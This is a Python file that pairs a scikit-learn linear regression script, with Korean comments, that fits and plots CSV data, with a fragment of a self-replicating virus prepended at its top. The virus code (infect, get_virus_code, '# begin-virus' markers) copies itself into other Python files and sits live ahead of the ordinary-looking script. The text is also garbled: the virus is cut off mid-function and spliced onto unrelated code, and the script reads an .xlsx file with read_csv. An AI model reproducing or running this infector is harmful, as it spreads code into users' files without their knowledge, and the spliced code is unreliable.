# begin-virus
        if "# begin-virus" in line:
            return None
    return data

def infect(file, virus_code):
    if (data := get_content_if_infectable(file)):
        with open(file, "w", encoding='utf-8') as infected_file:
            infected_file.write("# begin-virus\n")
            infected_file.write(virus_code)
            infected_file.writelines(data)

def get_virus_code():
    virus_code_on = False
    virus_code = []

    code = get_content_of_file(__file__)

    for line in code:
        if "# begin-virus" in line:
            virus_code_on = True

        if virus_code_on:
            virus_code.append(line)

        if "# end-virus" in line:
import matplotlib.pyplot as plt
import pandas as pd
from sklearn.linear_model import LinearRegression

# 훈련 데이터 준비
df = pd.read_csv('231217737.csv', engine='python')
print(df.columns)
df.columns = ['Column1', 'Column2', 'Column3']
X_train = data = df[['Column1']]
#X_train = [[1], [2], [3], [4], [5]]  # 독립 변수
#y_train = [2, 4, 9, 2, 10]  # 종속 변수
y_train = data = df[['Column2']]


# 선형 회귀 모델 생성 및 훈련
model = LinearRegression()
model.fit(X_train, y_train)

# 예측할 데이터 준비
X_test = [[6], [7], [8]]  # 예측할 독립 변수

# 예측 결과
y_pred = model.predict(X_test)

# CSV 파일에서 데이터 읽어오기
data = pd.read_csv("C:/Users/yb301/Desktop/231122.xlsx")  # 데이터 파일의 경로와 이름에 맞게 수정해주세요

# 읽어온 데이터로 예측
X_custom = data[['E']]  # 데이터 파일에서 독립 변수 열의 이름에 맞게 수정
y_custom_pred = model.predict(X_custom)

# 데이터 시각화
plt.scatter(X_train, y_train, color='blue', label='Training Data')
plt.plot(X_test, y_pred, color='red', label='Linear Regression')
plt.scatter(X_custom, y_custom_pred, color='green', label='Custom Data')
plt.xlabel('X')
plt.ylabel('Y')
plt.title('Linear Regression')
plt.legend()
plt.show()